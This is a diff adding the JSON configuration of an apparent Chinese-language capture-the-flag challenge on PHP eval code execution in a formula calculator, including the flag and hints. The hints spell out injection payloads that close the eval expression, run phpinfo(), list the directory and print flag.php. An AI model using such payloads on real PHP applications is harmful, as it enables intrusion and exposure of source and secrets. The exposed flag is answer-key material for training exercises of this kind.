@@ -1,0 +1,24 @@
+{
+  "id": "rce5",
+  "category": "rce",
+  "title": "迷你公式计算器 · eval 代码执行",
+  "difficulty": "easy",
+  "url_path": "/rce5",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{rce5_f29497e7}",
+  "knowledge": [
+    "eval 代码执行",
+    "闭合原语句+注释尾部（1);payload;//）",
+    "代码执行 vs 命令执行",
+    "highlight_file/show_source 读源码"
+  ],
+  "hints": [
+    "输入被包进 eval('echo (' . $expr . ');')，先闭合 ) 和 ;，再用 // 注释掉尾部",
+    "?expr=1);phpinfo();// 验证代码执行；?expr=1);print_r(scandir('.'));// 列目录",
+    "?expr=1);highlight_file('flag.php');//"
+  ],
+  "writeup": "writeup.md",
+  "prev": "rce4",
+  "next": "rce6"
+}
